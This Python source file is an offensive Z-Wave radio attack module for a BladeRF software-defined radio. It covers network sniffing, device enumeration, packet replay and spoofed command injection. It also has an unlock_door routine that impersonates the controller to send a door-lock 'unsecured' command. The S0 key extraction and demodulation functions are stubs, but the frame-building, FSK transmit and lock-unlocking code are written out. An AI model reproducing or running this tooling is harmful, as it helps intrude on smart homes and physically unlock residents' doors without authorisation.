#!/usr/bin/env python3
"""
RF Arsenal OS - Z-Wave Attack Module
Hardware: BladeRF 2.0 micro xA9

Capabilities:
- Network discovery and device enumeration
- S0 security key extraction (known vulnerability)
- S2 security analysis
- Packet capture and injection
- Device impersonation
- Replay attacks
"""

import logging
import numpy as np
from dataclasses import dataclass, field
from typing import Optional, Dict, List
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


class ZWaveRegion(Enum):
    """Z-Wave frequency regions"""
    US = 908_420_000      # US/Canada (908.42 MHz)
    EU = 868_420_000      # Europe (868.42 MHz)
    ANZ = 921_420_000     # Australia/NZ (921.42 MHz)
    HK = 919_820_000      # Hong Kong (919.82 MHz)
    JP = 922_500_000      # Japan (922.5 MHz)
    RU = 869_000_000      # Russia (869.0 MHz)


class ZWaveSecurityClass(Enum):
    """Z-Wave security classes"""
    NONE = "none"
    S0 = "s0"              # Legacy security (vulnerable)
    S2_UNAUTHENTICATED = "s2_unauthenticated"
    S2_AUTHENTICATED = "s2_authenticated"
    S2_ACCESS_CONTROL = "s2_access_control"


class ZWaveDeviceClass(Enum):
    """Z-Wave device classes"""
    CONTROLLER = "controller"
    STATIC_CONTROLLER = "static_controller"
    SLAVE = "slave"
    ROUTING_SLAVE = "routing_slave"


class ZWaveVulnerability(Enum):
    """Known Z-Wave vulnerabilities"""
    S0_KEY_EXCHANGE = "s0_insecure_key_exchange"
    NO_ENCRYPTION = "no_encryption"
    REPLAY_VULNERABLE = "replay_attack"
    DEFAULT_KEY = "default_network_key"
    DOWNGRADE = "security_downgrade"


@dataclass
class ZWaveDevice:
    """Discovered Z-Wave device"""
    node_id: int
    home_id: int
    device_class: ZWaveDeviceClass
    manufacturer_id: int
    product_type: int
    product_id: int
    security_class: ZWaveSecurityClass
    rssi: float
    command_classes: List[int] = field(default_factory=list)
    vulnerabilities: List[ZWaveVulnerability] = field(default_factory=list)
    last_seen: str = ""
    
    def __post_init__(self):
        if not self.last_seen:
            self.last_seen = datetime.now().isoformat()
    
    @property
    def manufacturer_name(self) -> str:
        """Get manufacturer name from ID"""
        manufacturers = {
            0x0086: "Aeotec",
            0x010F: "Fibaro",
            0x019B: "Yale",
            0x003B: "Schlage",
            0x0063: "GE/Jasco",
            0x0109: "Ring",
        }
        return manufacturers.get(self.manufacturer_id, f"Unknown (0x{self.manufacturer_id:04X})")


@dataclass
class ZWaveNetwork:
    """Discovered Z-Wave network"""
    home_id: int
    region: ZWaveRegion
    controller: Optional[ZWaveDevice]
    devices: List[ZWaveDevice] = field(default_factory=list)
    network_key: Optional[bytes] = None
    s0_key: Optional[bytes] = None
    s2_keys: Dict[str, bytes] = field(default_factory=dict)
    
    @property
    def device_count(self) -> int:
        return len(self.devices) + (1 if self.controller else 0)


@dataclass
class ZWavePacket:
    """Captured Z-Wave packet"""
    raw_data: bytes
    home_id: int
    source_node: int
    destination_node: int
    command_class: int
    command: int
    payload: bytes
    rssi: float
    timestamp: str
    encrypted: bool = False
    security_class: ZWaveSecurityClass = ZWaveSecurityClass.NONE


class ZWaveAttacker:
    """
    Z-Wave Protocol Attack System
    
    Supports:
    - Passive network discovery
    - S0 security key extraction
    - Packet injection and replay
    - Device impersonation
    """
    
    # Z-Wave S0 default key (all zeros - used during pairing)
    S0_DEFAULT_KEY = bytes(16)
    
    # Z-Wave data rates
    DATA_RATES = {
        '9.6k': 9600,
        '40k': 40000,
        '100k': 100000
    }
    
    def __init__(self, hardware_controller=None, region: ZWaveRegion = ZWaveRegion.US):
        """
        Initialize Z-Wave attacker
        
        Args:
            hardware_controller: BladeRF hardware controller
            region: Z-Wave frequency region
        """
        self.hw = hardware_controller
        self.region = region
        self.is_running = False
        self.discovered_networks: Dict[int, ZWaveNetwork] = {}
        self.discovered_devices: Dict[str, ZWaveDevice] = {}
        self.captured_packets: List[ZWavePacket] = []
        self.extracted_keys: Dict[int, bytes] = {}  # Home ID -> S0 key
        
        logger.info(f"Z-Wave Attacker initialized (Region: {region.name})")
    
    def scan_networks(self, duration: float = 30.0) -> List[ZWaveNetwork]:
        """
        Scan for Z-Wave networks
        
        Args:
            duration: Scan duration in seconds
            
        Returns:
            List of discovered networks
        """
        logger.info(f"Scanning for Z-Wave networks ({duration}s)...")
        networks = []
        
        if self.hw:
            try:
                # Configure SDR for Z-Wave
                self.hw.configure_hardware({
                    'frequency': self.region.value,
                    'sample_rate': 2_000_000,
                    'bandwidth': 500_000,
                    'rx_gain': 40
                })
                
                # Capture samples
                samples = self.hw.receive_samples(int(2_000_000 * duration))
                if samples is not None:
                    packets = self._demodulate_zwave(samples)
                    networks = self._extract_networks(packets)
                    
            except Exception as e:
                logger.error(f"Scan error: {e}")
        
        for network in networks:
            self.discovered_networks[network.home_id] = network
        
        logger.info(f"Found {len(networks)} Z-Wave networks")
        return networks
    
    def _demodulate_zwave(self, samples: np.ndarray) -> List[ZWavePacket]:
        """Demodulate Z-Wave FSK signal"""
        packets = []
        
        # Z-Wave uses FSK modulation
        # 9.6 kbps: ±20 kHz deviation
        # 40 kbps: ±40 kHz deviation
        # 100 kbps: ±58 kHz deviation
        
        # In production, implement full Z-Wave PHY demodulation
        
        return packets
    
    def _extract_networks(self, packets: List[ZWavePacket]) -> List[ZWaveNetwork]:
        """Extract network information from packets"""
        networks = {}
        
        for packet in packets:
            if packet.home_id not in networks:
                networks[packet.home_id] = ZWaveNetwork(
                    home_id=packet.home_id,
                    region=self.region,
                    controller=None
                )
        
        return list(networks.values())
    
    def discover_devices(self, home_id: int, duration: float = 60.0) -> List[ZWaveDevice]:
        """
        Discover devices on a Z-Wave network
        
        Args:
            home_id: Target network Home ID
            duration: Discovery duration
            
        Returns:
            List of discovered devices
        """
        logger.info(f"Discovering devices on network 0x{home_id:08X}")
        devices = []
        
        # Listen for network traffic to identify nodes
        packets = self.sniff_traffic(duration, filter_home_id=home_id)
        
        seen_nodes = set()
        for packet in packets:
            if packet.source_node not in seen_nodes:
                seen_nodes.add(packet.source_node)
                device = ZWaveDevice(
                    node_id=packet.source_node,
                    home_id=home_id,
                    device_class=ZWaveDeviceClass.SLAVE,
                    manufacturer_id=0,
                    product_type=0,
                    product_id=0,
                    security_class=packet.security_class,
                    rssi=packet.rssi
                )
                devices.append(device)
                self.discovered_devices[f"{home_id}:{packet.source_node}"] = device
        
        logger.info(f"Discovered {len(devices)} devices")
        return devices
    
    def sniff_traffic(self, duration: float = 60.0, 
                      filter_home_id: Optional[int] = None) -> List[ZWavePacket]:
        """
        Sniff Z-Wave traffic
        
        Args:
            duration: Sniff duration in seconds
            filter_home_id: Optional Home ID filter
            
        Returns:
            List of captured packets
        """
        logger.info(f"Sniffing Z-Wave traffic for {duration}s")
        packets = []
        
        if self.hw:
            try:
                self.hw.configure_hardware({
                    'frequency': self.region.value,
                    'sample_rate': 2_000_000,
                    'bandwidth': 500_000,
                    'rx_gain': 40
                })
                
                samples = self.hw.receive_samples(int(2_000_000 * duration))
                if samples is not None:
                    packets = self._demodulate_zwave(samples)
                    
                    if filter_home_id:
                        packets = [p for p in packets if p.home_id == filter_home_id]
                        
            except Exception as e:
                logger.error(f"Sniff error: {e}")
        
        self.captured_packets.extend(packets)
        logger.info(f"Captured {len(packets)} packets")
        return packets
    
    def extract_s0_key(self, home_id: int) -> Optional[bytes]:
        """
        Extract S0 network key using known vulnerability
        
        The S0 key exchange is vulnerable because the initial
        key exchange uses a known default key (all zeros).
        By capturing the key exchange during device pairing,
        we can recover the network key.
        
        Args:
            home_id: Target network Home ID
            
        Returns:
            S0 network key if extracted
        """
        logger.warning(f"Attempting S0 key extraction for network 0x{home_id:08X}")
        logger.info("Waiting for device pairing event...")
        
        # Monitor for Security Scheme Get/Report commands
        # During S0 pairing:
        # 1. Controller sends Network Key Set encrypted with default key
        # 2. We decrypt with known default key to get actual network key
        
        # This is a well-documented vulnerability
        # Reference: Z-Shave attack (DEF CON 24)
        
        return None
    
    def replay_attack(self, packet: ZWavePacket, count: int = 1) -> bool:
        """
        Replay a captured Z-Wave packet
        
        Args:
            packet: Packet to replay
            count: Number of times to replay
            
        Returns:
            True if successful
        """
        if packet.encrypted and packet.security_class != ZWaveSecurityClass.NONE:
            logger.warning("Replaying encrypted packet - may not work if using nonces")
        
        logger.info(f"Replaying packet from node {packet.source_node} {count}x")
        
        for _ in range(count):
            if not self._transmit_packet(packet.raw_data):
                return False
        
        return True
    
    def inject_command(self, home_id: int, source_node: int, 
                       dest_node: int, command_class: int, 
                       command: int, payload: bytes = b'') -> bool:
        """
        Inject a Z-Wave command
        
        Args:
            home_id: Network Home ID
            source_node: Source node ID (spoofed)
            dest_node: Destination node ID
            command_class: Z-Wave command class
            command: Command within class
            payload: Command payload
            
        Returns:
            True if successful
        """
        logger.info(f"Injecting command 0x{command_class:02X}:0x{command:02X} to node {dest_node}")
        
        # Build Z-Wave frame
        frame = self._build_frame(home_id, source_node, dest_node, 
                                   command_class, command, payload)
        
        return self._transmit_packet(frame)
    
    def _build_frame(self, home_id: int, src: int, dst: int,
                     cmd_class: int, cmd: int, payload: bytes) -> bytes:
        """Build Z-Wave frame"""
        frame = bytearray()
        
        # Home ID (4 bytes)
        frame.extend(home_id.to_bytes(4, 'big'))
        
        # Source node ID
        frame.append(src)
        
        # Frame control
        frame.append(0x41)  # Routed, ACK request
        
        # Length
        frame.append(len(payload) + 2)
        
        # Destination node ID
        frame.append(dst)
        
        # Command class
        frame.append(cmd_class)
        
        # Command
        frame.append(cmd)
        
        # Payload
        frame.extend(payload)
        
        # Checksum (XOR of all bytes)
        checksum = 0xFF
        for b in frame:
            checksum ^= b
        frame.append(checksum)
        
        return bytes(frame)
    
    def _transmit_packet(self, data: bytes) -> bool:
        """Transmit Z-Wave packet"""
        if not self.hw:
            logger.error("No hardware controller")
            return False
        
        try:
            self.hw.configure_hardware({
                'frequency': self.region.value,
                'sample_rate': 2_000_000,
                'bandwidth': 500_000,
                'tx_gain': 10
            })
            
            # FSK modulate
            samples = self._modulate_fsk(data)
            
            return self.hw.transmit_burst(samples)
            
        except Exception as e:
            logger.error(f"Transmit error: {e}")
            return False
    
    def _modulate_fsk(self, data: bytes, data_rate: int = 40000) -> np.ndarray:
        """Modulate data using FSK"""
        sample_rate = 2_000_000
        samples_per_bit = sample_rate // data_rate
        
        # Frequency deviation
        if data_rate == 9600:
            deviation = 20000
        elif data_rate == 40000:
            deviation = 40000
        else:
            deviation = 58000
        
        num_samples = len(data) * 8 * samples_per_bit
        samples = np.zeros(num_samples, dtype=np.complex64)
        
        idx = 0
        phase = 0
        
        for byte in data:
            for bit in range(8):
                bit_val = (byte >> (7 - bit)) & 1
                freq = deviation if bit_val else -deviation
                
                for _ in range(samples_per_bit):
                    if idx < len(samples):
                        samples[idx] = np.exp(1j * phase)
                        phase += 2 * np.pi * freq / sample_rate
                    idx += 1
        
        return samples * 0.3
    
    def unlock_door(self, home_id: int, lock_node: int) -> bool:
        """
        Attempt to unlock a Z-Wave door lock
        
        Args:
            home_id: Network Home ID
            lock_node: Lock node ID
            
        Returns:
            True if command sent successfully
        """
        logger.warning(f"Attempting to unlock door lock (node {lock_node})")
        
        # Door Lock Command Class (0x62)
        # Door Lock Operation Set (0x01)
        # Value: 0x00 = Unsecured
        
        return self.inject_command(
            home_id=home_id,
            source_node=1,  # Spoof as controller
            dest_node=lock_node,
            command_class=0x62,  # COMMAND_CLASS_DOOR_LOCK
            command=0x01,        # DOOR_LOCK_OPERATION_SET
            payload=bytes([0x00])  # Unsecured
        )
    
    def get_network_summary(self) -> Dict:
        """Get summary of discovered networks"""
        return {
            'region': self.region.name,
            'frequency_mhz': self.region.value / 1e6,
            'networks_discovered': len(self.discovered_networks),
            'devices_discovered': len(self.discovered_devices),
            'packets_captured': len(self.captured_packets),
            'keys_extracted': len(self.extracted_keys),
            'networks': [
                {
                    'home_id': f"0x{home_id:08X}",
                    'device_count': net.device_count,
                    's0_key_known': net.s0_key is not None
                }
                for home_id, net in self.discovered_networks.items()
            ]
        }
    
    def stop(self):
        """Stop all operations"""
        self.is_running = False
        if self.hw:
            self.hw.stop_transmission()
        logger.info("Z-Wave operations stopped")
